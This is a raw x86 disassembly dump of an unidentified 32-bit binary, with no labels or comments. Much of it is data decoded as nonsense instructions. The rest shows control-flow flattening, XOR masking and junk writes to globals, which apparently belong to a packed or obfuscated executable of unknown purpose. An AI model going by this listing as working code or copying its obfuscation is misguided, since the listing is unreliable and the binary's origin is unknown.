  4091a0:	jne    0x40921b
  4091a2:	das    
  4091a3:	ret    
  4091a4:	in     eax,dx
  4091a5:	out    dx,al
  4091a6:	call   DWORD PTR [esi+0x3d]
  4091a9:	test   eax,0xba80cb1c
  4091ae:	stos   BYTE PTR es:[edi],al
  4091af:	pusha  
  4091b0:	pop    esp
  4091b1:	jns    0x40921e
  4091b3:	xor    BYTE PTR [edi],dl
  4091b5:	pushf  
  4091b6:	xchg   edx,eax
  4091b7:	mov    cl,0x5c
  4091b9:	loopne 0x4091e7
  4091bb:	lea    ebx,[ebp+0x37]
  4091be:	retf   0xc674
  4091c1:	push   ecx
  4091c2:	faddp  st(5),st
  4091c4:	push   ebp
  4091c5:	xor    eax,0x5f37e88c
  4091ca:	xchg   edx,eax
  4091cb:	out    0x71,al
  4091cd:	in     al,0xa9
  4091cf:	sub    bh,BYTE PTR [edi+0x3c]
  4091d2:	push   ds
  4091d3:	add    edx,DWORD PTR [ebx-0x4c58cd80]
  4091d9:	(bad)  
  4091da:	adc    esp,edi
  4091dc:	pop    edi
  4091dd:	out    dx,eax
  4091de:	mov    ebp,0xf51538b6
  4091e3:	rol    BYTE PTR [edi],1
  4091e5:	fst    QWORD PTR [esi-0x41b38bb4]
  4091eb:	dec    edi
  4091ec:	lock bound ebx,QWORD PTR [edi-0x58]
  4091f0:	adc    al,0xb6
  4091f2:	mov    ch,0x29
  4091f4:	fidiv  DWORD PTR [ebp-0xd]
  4091f7:	lods   al,BYTE PTR ds:[esi]
  4091f8:	inc    edx
  4091f9:	shr    DWORD PTR [ecx],cl
  4091fb:	into   
  4091fc:	fdivr  st,st(7)
  4091fe:	dec    edx
  4091ff:	cwde   
  409200:	xchg   DWORD PTR [esi],ecx
  409202:	mov    esp,edi
  409204:	repnz mov ebp,0x199d322
  40920a:	fisubr WORD PTR [edx]
  40920c:	iret   
  40920d:	cs mov edx,0x6cf2c38
  409213:	sub    al,0x5a
  409215:	jno    0x4091f5
  409217:	push   cs
  409218:	rcr    BYTE PTR [eax-0x2aa62d03],0x1f
  40921f:	nop
  409220:	sbb    esp,DWORD PTR ds:0xa29329c
  409226:	fldcw  WORD PTR [edx]
  409228:	popf   
  409229:	ds fs (bad) 
  40922c:	and    dh,ch
  40922e:	call   0xca48d5e5
  409233:	or     al,0x8b
  409235:	retf   
  409236:	mov    ch,0x4f
  409238:	sub    eax,0xb70af6e9
  40923d:	fcmovu st,st(3)
  40923f:	dec    eax
  409240:	inc    ebx
  409241:	jl     0x4091fd
  409243:	sbb    dh,BYTE PTR [esp+ebx*1+0x733fd9a3]
  40924a:	mov    ebp,DWORD PTR [ecx]
  40924c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40924d:	jmp    0x40922e
  40924f:	mov    BYTE PTR [edx],0x55
  409252:	add    eax,0xa0eda2c1
  409257:	pop    es
  409258:	sar    edx,1
  40925a:	adc    al,0x76
  40925c:	mov    dh,0xac
  40925e:	inc    esi
  40925f:	test   eax,0xb25e235b
  409264:	popf   
  409265:	leave  
  409266:	mov    bl,0x2f
  409268:	push   cs
  409269:	stos   DWORD PTR es:[edi],eax
  40926a:	adc    eax,0xda18e66d
  40926f:	xor    BYTE PTR [ebx+eax*2],cl
  409272:	xchg   edx,eax
  409273:	mov    ebx,DWORD PTR [edi-0x22]
  409276:	ror    edi,0x1
  409279:	inc    esi
  40927a:	lea    esp,[edx+0x14]
  40927d:	je     0x409290
  40927f:	push   es
  409280:	and    ecx,DWORD PTR [ebp-0x52]
  409283:	cmp    eax,0x5b8ccdbc
  409288:	out    0xc1,al
  40928a:	fnstenv [esi]
  40928c:	clc    
  40928d:	sub    DWORD PTR [ebx+0x75],0x7cabfab2
  409294:	lods   eax,DWORD PTR ds:[esi]
  409295:	(bad)  
  409297:	jmp    0x414a:0x4d2ca199
  40929e:	inc    edi
  40929f:	imul   edx,esp,0xfffffff2
  4092a2:	retf   
  4092a3:	or     ebp,DWORD PTR [ecx-0x1d669330]
  4092a9:	aad    0xef
  4092ab:	inc    esp
  4092ac:	xchg   eax,esp
  4092ae:	pusha  
  4092af:	into   
  4092b0:	cmp    eax,0xd299e643
  4092b5:	fwait
  4092b6:	jg     0x40925f
  4092b8:	sbb    edx,DWORD PTR cs:[esi+0x26]
  4092bc:	dec    edi
  4092bd:	mov    bl,0xc0
  4092bf:	jbe    0x409268
  4092c1:	ret    0xfa39
  4092c4:	inc    esp
  4092c5:	aaa    
  4092c6:	mov    dh,0xd3
  4092c8:	push   ds
  4092c9:	dec    ah
  4092cb:	jmp    0x9f3c:0xcb5a67f6
  4092d2:	cmc    
  4092d3:	cmc    
  4092d4:	lods   eax,DWORD PTR ds:[esi]
  4092d5:	push   eax
  4092d6:	xchg   edi,eax
  4092d7:	or     DWORD PTR [edi-0x52a3d484],edi
  4092dd:	inc    ebp
  4092de:	sbb    DWORD PTR ds:0x2556daa6,ebp
  4092e4:	lahf   
  4092e5:	xor    al,dl
  4092e7:	adc    al,0x8d
  4092e9:	repnz sub eax,0x9efa38b3
  4092ef:	ins    BYTE PTR es:[edi],dx
  4092f0:	sbb    edx,DWORD PTR [ebx]
  4092f2:	or     BYTE PTR [ecx+0x2e],dl
  4092f5:	movq   mm2,mm1
  4092f8:	xchg   esp,eax
  4092f9:	lea    edi,[ebp-0x3f]
  4092fc:	test   al,0x82
  4092fe:	ret    0xa01d
  409301:	xchg   ebp,eax
  409302:	or     dh,0x79
  409305:	adc    BYTE PTR ds:0x91fd6f6f,ah
  40930b:	push   esi
  40930c:	pop    ds
  40930d:	(bad)  
  40930e:	jmp    0x27834999
  409313:	dec    ecx
  409314:	mov    bl,BYTE PTR [eax+0x30]
  409317:	push   ebx
  409318:	mov    esi,DWORD PTR [esp+ebx*8-0x2a]
  40931c:	jmp    0x796af001
  409321:	dec    ebx
  409322:	cmp    DWORD PTR [esi],eax
  409324:	xchg   esi,eax
  409325:	mov    cl,ch
  409327:	jae    0x40939d
  409329:	std    
  40932a:	call   0xc1b1a8ab
  40932f:	mov    ah,0x45
  409331:	cwde   
  409332:	cmp    al,0xeb
  409334:	loop   0x409353
  409336:	outs   dx,BYTE PTR ds:[esi]
  409337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409338:	cli    
  409339:	ins    BYTE PTR es:[edi],dx
  40933a:	cmp    BYTE PTR [esi-0x6c],bl
  40933d:	mov    eax,0x8bd80122
  409342:	inc    ebp
  409343:	in     al,dx
  409344:	jmp    0x4084bd
  409349:	mov    eax,DWORD PTR [ebp-0xc]
  40934c:	mov    edx,DWORD PTR [ebp-0x18]
  40934f:	xor    eax,edx
  409351:	cmp    eax,0xa08c1d35
  409356:	je     0x4084ba
  40935c:	mov    eax,DWORD PTR [ebp-0x10]
  40935f:	add    DWORD PTR [eax],0x7403501
  409365:	jmp    0x4084ba
  40936a:	mov    eax,DWORD PTR [ebp-0x1c]
  40936d:	cmp    DWORD PTR [eax],edi
  40936f:	je     0x4084ba
  409375:	mov    eax,0x800f1c9c
  40937a:	jmp    0x4084c1
  40937f:	push   ebp
  409380:	mov    ebp,esp
  409382:	sub    esp,0x60
  409385:	adc    eax,DWORD PTR ds:0x4335e3
  40938b:	jmp    0x4094bf
  409390:	add    al,0xbb
  409392:	js     0x4093e4
  409394:	inc    ebx
  409395:	push   ebx
  409396:	push   esp
  409397:	dec    ebx
  409398:	xor    al,0xcd
  40939a:	in     al,dx
  40939b:	les    edx,FWORD PTR [edx-0x617cf722]
  4093a1:	in     eax,dx
  4093a2:	jl     0x409420
  4093a4:	adc    eax,0x3c7c7c7f
  4093a9:	test   BYTE PTR [edi],0xd5
  4093ac:	dec    edx
  4093ad:	sbb    BYTE PTR [edx-0x57],0x5
  4093b1:	test   BYTE PTR [edi+0x78319c11],0x5
  4093b8:	push   es
  4093b9:	test   eax,0x42dacf72
  4093be:	ror    DWORD PTR [esp+eiz*2-0x40],1
  4093c2:	test   BYTE PTR [ebx+0x66],bl
  4093c5:	jecxz  0x40934a
  4093c7:	in     eax,dx
  4093c8:	out    dx,al
  4093c9:	lds    edx,FWORD PTR [eax]
  4093cb:	pop    ecx
  4093cc:	pop    ecx
  4093cd:	shr    DWORD PTR [edx],cl
  4093cf:	dec    esi
  4093d0:	inc    ecx
  4093d1:	retf   0x38b5
  4093d4:	popf   
  4093d5:	sti    
  4093d6:	sbb    eax,0xb673dd57
  4093db:	fadd   st,st(5)
  4093dd:	pop    edx
  4093de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093df:	and    al,0xb3
  4093e1:	mov    bh,0x69
  4093e3:	(bad)  
  4093e4:	push   ebp
  4093e5:	add    BYTE PTR [ebp+0x134ef373],0x9f
  4093ec:	std    
  4093ed:	les    eax,FWORD PTR [ecx+esi*8]
  4093f0:	fdivr  DWORD PTR [edi+ebp*2+0x1ad4eedb]
  4093f7:	out    dx,al
  4093f8:	and    eax,0x207790bf
  4093fd:	scas   eax,DWORD PTR es:[edi]
  4093fe:	add    eax,DWORD PTR [eax]
  409400:	nop
  409401:	dec    esp
  409402:	sbb    eax,0x9f4af1ff
  409407:	mov    WORD PTR [edi+ecx*8],fs
  40940a:	pop    ss
  40940b:	cld    
  40940c:	into   
  40940d:	or     al,0x29
  40940f:	sbb    dl,cl
  409411:	xchg   BYTE PTR [edi-0x45],ch
  409414:	cli    
  409415:	ja     0x4093f3
  409417:	cld    
  409418:	scas   eax,DWORD PTR es:[edi]
  409419:	add    ah,BYTE PTR [esi-0x17]
  40941c:	push   0x7f
  40941e:	or     bl,BYTE PTR [eax-0x16]
  409421:	inc    ebx
  409422:	fninit 
  409424:	test   al,0xde
  409426:	cwde   
  409427:	inc    edx
  409428:	popa   
  409429:	fcomip st,st(1)
  40942b:	push   ebp
  40942c:	mov    ch,0x59
  40942e:	mov    ?,WORD PTR [ecx-0x34]
  409431:	and    BYTE PTR [edx+0x2b],bh
  409434:	(bad)  
  409436:	mov    gs,WORD PTR es:0x7941fbd0
  40943d:	lock not BYTE PTR [ecx-0x49421f03]
  409444:	push   ss
  409445:	out    dx,al
  409446:	push   ecx
  409447:	cli    
  409448:	mov    edi,0x9a4b5943
  40944d:	leave  
  40944e:	sbb    cl,ch
  409450:	(bad)
  409454:	mov    ebp,0x5d8a78e9
  409459:	and    eax,0x88c2bde6
  40945e:	stc    
  40945f:	in     al,dx
  409460:	dec    ecx
  409461:	mov    cl,0x74
  409463:	(bad)  
  409464:	xchg   ecx,eax
  409465:	mov    esp,0xdd1aa9c0
  40946a:	daa    
  40946b:	mov    ecx,0x97ea062f
  409470:	sbb    al,0x5f
  409472:	mov    ds:0x4384dd99,al
  409477:	ss jp  0x4094f7
  40947a:	inc    ebp
  40947b:	out    0x6f,al
  40947d:	rcl    DWORD PTR ds:0xccd3014a,0x8f
  409484:	or     ebx,ebx
  409486:	xchg   eax,ecx
  409488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409489:	jne    0x4094da
  40948b:	icebp  
  40948c:	(bad)  
  40948d:	and    eax,0x283af915
  409492:	add    ebx,DWORD PTR [edx+edi*1+0x6d]
  409496:	cmp    eax,0xaf3387fc
  40949b:	pusha  
  40949c:	into   
  40949d:	hlt    
  40949e:	imul   ecx,ebp,0x93a4c3d2
  4094a4:	adc    BYTE PTR [edx-0x2d],ah
  4094a7:	xor    bh,BYTE PTR [ebx+0x1761ffb1]
  4094ad:	push   ds
  4094ae:	sar    BYTE PTR [esi+edi*4],1
  4094b1:	push   edi
  4094b2:	call   0xf690:0xa4c22802
  4094b9:	jae    0x40943c
  4094bb:	push   cs
  4094bc:	aad    0xe4
  4094be:	or     DWORD PTR [ebx+0xd810845],0x4335e7
  4094c8:	cmp    BYTE PTR [eax+eax*1],cl
  4094cb:	add    BYTE PTR [ebx-0x7f],dl
  4094ce:	adc    eax,0x433557
  4094d3:	inc    edi
  4094d4:	popa   
  4094d5:	add    BYTE PTR [eax],al
  4094d7:	push   esi
  4094d8:	mov    esi,0x7510853
  4094dd:	add    DWORD PTR ds:0x433667,0x296a
  4094e7:	xor    eax,esi
  4094e9:	and    ebx,0x43d6
  4094ef:	mov    ebx,0x32729a
  4094f4:	and    DWORD PTR ds:0x43355f,0x433557
  4094fe:	add    eax,ebx
  409500:	adc    DWORD PTR ds:0x43365f,0x1959
  40950a:	push   edi
  40950b:	or     DWORD PTR ds:0x4335ab,ecx
  409511:	mov    DWORD PTR [ebp-0x18],eax
  409514:	and    DWORD PTR ds:0x43355b,0x4f47
  40951e:	mov    edi,DWORD PTR [ebp+0x8]
  409521:	xor    edi,esi
  409523:	sbb    DWORD PTR ds:0x4335af,0x43366b
  40952d:	mov    DWORD PTR [ebp-0xc],0xf89c85f5
  409534:	or     DWORD PTR ds:0x4335af,0x30d7
  40953e:	mov    DWORD PTR [ebp-0x10],0xf89c8735
  409545:	add    DWORD PTR ds:0x433567,0x43362f
  40954f:	add    edi,ebx
  409551:	jmp    0x4099a2
  409556:	mov    DWORD PTR ds:0x433597,0x217e
  409560:	cmp    edi,0x40
  409563:	mov    DWORD PTR ds:0x4335ef,0x49f
  40956d:	jne    0x4095a6
  409573:	mov    DWORD PTR ds:0x43366b,ecx
  409579:	mov    eax,ds:0x413996
  40957e:	mov    eax,DWORD PTR [eax]
  409580:	mov    DWORD PTR ds:0x433563,0x21e9
  40958a:	mov    DWORD PTR [ebp-0x14],eax
  40958d:	mov    eax,ds:0x413b9e
  409592:	mov    DWORD PTR ds:0x43362f,0x54b7
  40959c:	mov    eax,DWORD PTR [eax]
  40959e:	mov    DWORD PTR [ebp-0x18],eax
  4095a1:	jmp    0x409996
  4095a6:	mov    DWORD PTR ds:0x43354b,0x76e8
  4095b0:	jmp    0x4096e4
  4095b5:	and    al,0x36
  4095b7:	popf   
  4095b8:	les    ebx,FWORD PTR [ebp-0x6f09829d]
  4095be:	lahf   
  4095bf:	jmp    0x40958c
  4095c1:	mov    eax,0xb7fc6456
  4095c6:	in     al,dx
  4095c7:	jl     0x409645
  4095c9:	adc    eax,0x8c7c7c7f
  4095ce:	dec    ecx
  4095cf:	adc    DWORD PTR [edx],ecx
  4095d1:	sub    BYTE PTR [esi-0x5e],0x94
  4095d5:	push   0x71
  4095d7:	(bad)  
  4095d8:	lea    esi,[ebx-0x16]
  4095db:	in     al,0x33
  4095dd:	ss das 
  4095df:	(bad)  
  4095e0:	xor    eax,0x9b860ec5
  4095e5:	adc    esp,edi
  4095e7:	test   DWORD PTR [ebx+0x47a04076],esi
  4095ed:	fs pop eax
  4095ef:	xor    esi,DWORD PTR [edx]
  4095f1:	mov    ebx,0x7280a8df
  4095f6:	scas   al,BYTE PTR es:[edi]
  4095f7:	shr    DWORD PTR [ecx],1
  4095f9:	pop    es
  4095fa:	adc    cl,cl
  4095fc:	test   eax,0xd2d77e2e
  409601:	nop
  409602:	adc    BYTE PTR [ebx+0x71],ah
  409605:	cmc    
  409606:	(bad)  
  409607:	xor    BYTE PTR [ebx+0x54116dcf],ah
  40960d:	stos   DWORD PTR es:[edi],eax
  40960e:	jns    0x40961f
  409610:	xor    esi,DWORD PTR [edi]
  409612:	mov    dh,0x9b
  409614:	jno    0x4095fb
  409616:	pop    ebp
  409617:	std    
  409618:	lods   eax,DWORD PTR ds:[esi]
  409619:	push   esi
  40961a:	cmp    BYTE PTR [edi+0x78],bl
  40961d:	jae    0x4095b9
  40961f:	jmp    0xef339760
  409624:	inc    ebp
  409625:	pushf  
  409626:	xor    eax,0x194ece7d
  40962b:	push   0xbc7b0a1e
  409630:	inc    eax
  409631:	repnz aas 
  409633:	pop    ds
  409634:	dec    eax
  409635:	pop    ecx
  409636:	cmc    
  409637:	lock jo 0x409636
  40963a:	lds    ebp,FWORD PTR [eax+0x3c08e798]
  409640:	mul    DWORD PTR [eax-0x52]
  409643:	ret    
  409644:	(bad)  
  409645:	jne    0x409601
  409647:	pop    edx
  409648:	mov    esi,0xb70515da
  40964d:	inc    edx
  40964e:	sub    dl,BYTE PTR [edi+esi*8+0x26]
  409652:	(bad)  
  409654:	dec    ebp
  409655:	cdq    
  409656:	jmp    0x40963d
  409658:	retf   
  409659:	pop    ebx
  40965a:	enter  0x4797,0x7e
  40965e:	pop    ds
  40965f:	and    esi,0x2df50ac4
  409665:	bound  eax,QWORD PTR [esi-0x46]
  409668:	dec    esi
  409669:	push   eax
  40966a:	lea    edi,[edi-0x21d6f352]
  409670:	jns    0x409600
  409672:	ins    BYTE PTR es:[edi],dx
  409673:	cwde   
  409674:	mov    ds:0x18582de8,al
  409679:	into   
  40967a:	mov    al,0x63
  40967c:	jne    0x40969b
  40967e:	outs   dx,DWORD PTR ds:[esi]
  40967f:	les    esi,FWORD PTR [ecx-0x32d5d9dc]
  409685:	dec    esp
  409686:	sahf   
  409687:	stos   BYTE PTR es:[edi],al
  409688:	out    dx,al
  409689:	mov    esp,0xd2c335cc
  40968e:	nop
  40968f:	in     eax,0x43
  409691:	mov    edx,0xc69f9157
  409696:	aad    0x5a
  409698:	jecxz  0x409641
  40969a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40969b:	shr    DWORD PTR [eax-0x59],1
  40969e:	js     0x40964e
  4096a0:	lock xor esp,DWORD PTR [ecx-0x7b49994d]
  4096a7:	pop    ecx
  4096a8:	sub    al,0x9
  4096aa:	(bad)  
  4096ab:	jno    0x409674
  4096ad:	xchg   ebx,eax
  4096ae:	fidivr DWORD PTR [ecx+0x6131909c]
  4096b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096b5:	fstp   QWORD PTR ds:0xf14c2f21
  4096bb:	pop    esi
  4096bc:	dec    esp
  4096bd:	and    eax,0xff405267
  4096c2:	add    cl,BYTE PTR [eax+0x4d]
  4096c5:	xor    BYTE PTR [eax-0x4856f1b9],bh
  4096cb:	(bad)  
  4096cc:	and    ch,dl
  4096ce:	sub    esp,DWORD PTR [esi-0x5b]
  4096d1:	repnz xchg ecx,eax
  4096d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096d4:	neg    DWORD PTR [eax]
  4096d6:	xchg   esp,eax
  4096d7:	lods   eax,DWORD PTR ds:[esi]
  4096d8:	(bad)  
  4096d9:	push   esp
  4096da:	ficom  WORD PTR ds:0x733fa066
  4096e0:	inc    BYTE PTR [ecx-0x7ea886]
  4096e6:	cmp    eax,0xc7000003
  4096eb:	add    eax,0x4335d7
  4096f0:	xchg   edi,eax
  4096f1:	add    DWORD PTR [eax],eax
  4096f3:	add    BYTE PTR [edi],cl
  4096f5:	test   DWORD PTR [eax+eax*1+0x0],ebp
  4096f9:	add    BYTE PTR [ebx-0x74fff79b],al
  4096ff:	inc    ebp
  409700:	clc    
  409701:	or     DWORD PTR ds:0x433623,0x4335e3
  40970b:	sub    eax,DWORD PTR [ebp+0x8]
  40970e:	push   eax
  40970f:	mov    eax,ds:0x433663
  409714:	or     DWORD PTR ds:0x433623,eax
  40971a:	mov    eax,DWORD PTR [ebp-0x4]
  40971d:	add    DWORD PTR ds:0x43353f,0x4335af
  409727:	add    eax,DWORD PTR [ebp+0x8]
  40972a:	sub    DWORD PTR ds:0x433627,0x4335a7
  409734:	push   eax
  409735:	dec    DWORD PTR ds:0x43354b
  40973b:	call   0x4099bc
  409740:	mov    DWORD PTR ds:0x433617,0x29a7
  40974a:	inc    DWORD PTR [ebp+0x8]
  40974d:	cmp    DWORD PTR [ebp+0x8],0x52
  409751:	mov    DWORD PTR ds:0x43355f,0x7d48
  40975b:	jb     0x4096fe
  409761:	jmp    0x409996
  409766:	mov    DWORD PTR ds:0x4335ef,0x5779
  409770:	cmp    edi,0x1a3
  409776:	mov    DWORD PTR ds:0x433667,0x175d
  409780:	jne    0x409964
  409786:	movzx  eax,BYTE PTR ds:0x43353f
  40978d:	and    DWORD PTR ds:0x4335af,eax
  409793:	mov    DWORD PTR [ebp-0x60],0xf89c8539
  40979a:	add    DWORD PTR ds:0x43362f,ebx
  4097a0:	mov    eax,DWORD PTR [ebp-0x4]
  4097a3:	xor    DWORD PTR ds:0x43359f,0x2808
  4097ad:	mov    DWORD PTR [ebp-0x5c],eax
  4097b0:	sub    eax,DWORD PTR ds:0x4335e7
  4097b6:	mov    eax,DWORD PTR [ebp-0x8]
  4097b9:	mov    DWORD PTR [ebp-0x58],eax
  4097bc:	mov    eax,DWORD PTR [ebp-0xc]
  4097bf:	xor    eax,esi
  4097c1:	and    DWORD PTR ds:0x433627,0x5f09
  4097cb:	add    eax,ebx
  4097cd:	and    DWORD PTR ds:0x43355f,0x3046
  4097d7:	mov    DWORD PTR [ebp-0x54],eax
  4097da:	sbb    DWORD PTR ds:0x4335eb,0x433633
  4097e4:	lea    eax,[ebp-0x1c]
  4097e7:	add    DWORD PTR ds:0x43361b,0x7d23
  4097f1:	mov    DWORD PTR [ebp-0x50],eax
  4097f4:	sub    eax,DWORD PTR ds:0x43355f
  4097fa:	mov    eax,DWORD PTR [ebp-0x60]
  4097fd:	or     DWORD PTR ds:0x4335b3,0x4335af
  409807:	xor    eax,esi
  409809:	add    eax,ebx
  40980b:	mov    DWORD PTR [ebp-0x60],eax
  40980e:	lea    eax,[ebp-0x60]
  409811:	push   eax
  409812:	mov    eax,DWORD PTR [ebp+0xc]
  409815:	jmp    0x409949
  40981a:	xchg   cl,bl
  40981c:	fs jg  0x409886
  40981f:	and    DWORD PTR [ecx+0x61],0x87fe859e
  409826:	sbb    cl,BYTE PTR [ebp-0x10b363e0]
  40982c:	jl     0x4098aa
  40982e:	adc    eax,0x4c7c7c7f
  409833:	outs   dx,DWORD PTR ds:[esi]
  409834:	daa    
  409835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409836:	rcl    BYTE PTR ds:0xdb492e36,0x5e
  40983d:	leave  
  40983e:	(bad)  
  40983f:	rol    BYTE PTR [edx],1
  409841:	xchg   ebp,eax
  409842:	pop    eax
  409843:	inc    ebp
  409844:	sbb    DWORD PTR [eax+0x5b],esp
  409847:	arpl   bx,di
  409849:	out    dx,eax
  40984a:	dec    DWORD PTR [ecx-0x3]
  40984d:	jne    0x4098a2
  40984f:	mov    ebx,0xb953efd8
  409854:	jnp    0x409882
  409856:	sahf   
  409857:	dec    edx
  409858:	stos   BYTE PTR es:[edi],al
  409859:	pushf  
  40985a:	jnp    0x40983f
  40985c:	ror    al,1
  40985e:	jp     0x4098c7
  409860:	jmp    DWORD PTR [ebx]
  409862:	adc    eax,0x9032c4e8
  409867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409868:	cmp    DWORD PTR [ecx],0x274432db
  40986e:	ss lock cs stc 
  409872:	fadd   DWORD PTR [edi-0x7d]
  409875:	dec    ebx
  409876:	push   es
  409877:	ret    0x5d93
  40987a:	pop    ss
  40987b:	inc    ecx
  40987c:	jg     0x40986c
  40987e:	sbb    BYTE PTR [edi+0x7273cf23],ah
  409884:	and    DWORD PTR [eax+0x6c085f5c],edi
  40988a:	add    eax,0xda4a757a
  40988f:	enter  0x26c5,0x22
  409893:	xchg   BYTE PTR [ecx],al
  409895:	mov    DWORD PTR [esi-0x4f],eax
  409898:	and    bl,BYTE PTR [esi-0x5a97152]
  40989e:	or     eax,esi
  4098a0:	dec    ebp
  4098a1:	pop    ebx
  4098a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a4:	push   0x4e8a1956
  4098a9:	adc    esi,DWORD PTR [eax-0x72]
  4098ac:	out    0x6e,eax
  4098ae:	jl     0x40985b
  4098b0:	push   es
  4098b1:	jp     0x409859
  4098b3:	inc    edx
  4098b4:	(bad)  
  4098b5:	push   ebx
  4098b6:	mov    bl,0x9a
  4098b8:	sti    
  4098b9:	sub    BYTE PTR [ebx],dh
  4098bb:	sub    eax,0xe7b6fd7a
  4098c0:	dec    esi
  4098c1:	cmc    
  4098c2:	sub    DWORD PTR [ebp+eiz*1+0x61],edi
  4098c6:	repnz int3 
  4098c8:	mov    al,ds:0x1fc12c19
  4098cd:	into   
  4098ce:	sbb    bl,BYTE PTR [eax+eax*1+0x14]
  4098d2:	pop    ebx
  4098d3:	fdiv   DWORD PTR [eax+0xf]
  4098d6:	add    BYTE PTR ss:[esi+0x215d745e],bh
  4098dd:	fldpi  
  4098df:	ins    BYTE PTR es:[edi],dx
  4098e0:	and    al,0x9e
  4098e2:	mov    dh,0xf
  4098e4:	int3   
  4098e5:	sbb    al,BYTE PTR [eax+0x5c]
  4098e8:	in     al,0xca
  4098ea:	repz jmp 0x21ea:0x247a21ed
  4098f2:	xor    DWORD PTR [eax+edi*4],ebp
  4098f5:	ds mov bl,0x81
  4098f8:	das    
  4098f9:	and    al,bl
  4098fb:	aaa    
  4098fc:	dec    eax
  4098fd:	jp     0x4098e9
  4098ff:	xor    ebp,DWORD PTR [ecx+eiz*4]
  409902:	pop    ss
  409903:	adc    ebx,DWORD PTR ds:[edi]
  409906:	add    DWORD PTR ds:0x280a4a35,ecx
  40990c:	(bad)  [esp+ecx*8]
  40990f:	and    al,0x99
  409911:	fsub   st(3),st
  409913:	and    bh,BYTE PTR [ebx]
  409915:	std    
  409916:	in     al,dx
  409917:	xor    DWORD PTR [esi*8-0x6f5a0f40],0x88902f84
  409922:	inc    esp
  409923:	push   eax
  409924:	retf   0xc121
  409927:	(bad)  
  409928:	mov    ds:0xd2a17e10,eax
  40992d:	(bad)  
  40992e:	mov    ch,0x2b
  409930:	pop    ebp
  409931:	inc    ebp
  409932:	and    BYTE PTR fs:[ecx-0x242f3575],ah
  409939:	pop    edx
  40993a:	or     al,0x96
  40993c:	mov    cl,0x43
  40993e:	push   ebx
  40993f:	fimul  DWORD PTR ds:0x4c3ebf3c
  409945:	and    al,0xbe
  409947:	pop    ecx
  409948:	mov    edi,0xc303c633
  40994d:	push   eax
  40994e:	mov    eax,ds:0x413b36
  409953:	push   0x413a8c
  409958:	push   DWORD PTR [eax]
  40995a:	call   0x4100b5
  40995f:	jmp    0x409996
  409964:	cmp    edi,0x13d
  40996a:	jne    0x409996
  409970:	mov    eax,DWORD PTR [ebp-0x10]
  409973:	xor    eax,esi
  409975:	add    eax,ebx
  409977:	mov    DWORD PTR [ebp+0x8],eax
  40997a:	mov    eax,ds:0x413b16
  40997f:	mov    DWORD PTR [ebp+0x8],eax
  409982:	mov    eax,DWORD PTR [ebp-0x14]
  409985:	mov    DWORD PTR [ebp-0x4],eax
  409988:	mov    eax,DWORD PTR [ebp-0x4]
  40998b:	push   0x4
  40998d:	pop    ecx
  40998e:	sub    ecx,eax
  409990:	add    ecx,DWORD PTR [ebp-0x18]
  409993:	mov    DWORD PTR [ebp-0x8],ecx
  409996:	mov    eax,DWORD PTR [ebp+0xc]
  409999:	xor    eax,esi
  40999b:	lea    edi,[edi+eax*1+0x32729a]
  4099a2:	cmp    edi,0x50b
  4099a8:	jne    0x409556
  4099ae:	mov    eax,DWORD PTR [ebp+0xc]
  4099b1:	pop    edi
  4099b2:	xor    eax,esi
  4099b4:	pop    esi
  4099b5:	add    eax,ebx
  4099b7:	pop    ebx
  4099b8:	leave  
  4099b9:	ret    0x8
  4099bc:	push   ebp
  4099bd:	mov    ebp,esp
  4099bf:	sub    esp,0x44
  4099c2:	neg    edx
  4099c4:	push   edi
  4099c5:	mov    eax,DWORD PTR [ebp+0xc]
  4099c8:	mov    edi,DWORD PTR ds:0x433633
  4099ce:	sub    DWORD PTR ds:0x43353f,edi
  4099d4:	mov    DWORD PTR [ebp-0x10],eax
  4099d7:	and    DWORD PTR ds:0x4335ef,0x1af7
  4099e1:	mov    eax,DWORD PTR [ebp+0x8]
  4099e4:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4099eb:	and    DWORD PTR ds:0x43362f,ebx
  4099f1:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  4099f8:	or     DWORD PTR ds:0x4335b3,ebx
  4099fe:	mov    edx,DWORD PTR [ebp+0x8]
  409a01:	add    DWORD PTR ds:0x43354f,ebx
  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x4335e3,0x1e
  409a19:	cmp    DWORD PTR ds:0x4335e3,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x4335e3,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43361b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x4335e3
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x4335e3,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x433673,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x4335db,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x433553
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x43353f,0x11
  409a8a:	cmp    DWORD PTR ds:0x43353f,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x43353f,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x43353f,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x43353f
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x43353f,edi
  409ad0:	mov    edi,DWORD PTR ds:0x43353f
  409ad6:	dec    edi
